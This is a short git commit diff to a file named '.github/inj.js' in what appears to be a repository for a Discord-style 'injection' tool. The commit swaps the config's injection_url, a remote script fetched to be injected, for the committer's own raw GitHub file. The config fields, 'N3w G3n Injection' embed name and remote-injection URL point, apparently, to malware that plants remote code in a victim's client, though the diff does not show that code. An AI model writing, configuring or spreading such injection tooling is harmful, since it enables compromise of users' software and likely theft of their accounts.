8d1eb24617d10237808405e60c8b9c1afbc0f029
EyeLoveBigBlackHawks <132662398+EyeLoveBigBlackHawks@users.noreply.github.com>
2023-10-14 21:06:09 +0100

    Update inj.js

--- .github/inj.js
+++ .github/inj.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'N3w G3n Injection', 
   embed_icon: 'https://megadico.com/ressources/IMAGES/loser.jpg', 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/EyeLoveBigBlackHawks/EyeLoveBigBlackHawks/main/.github/inj.js', 
   /**
    
    **/
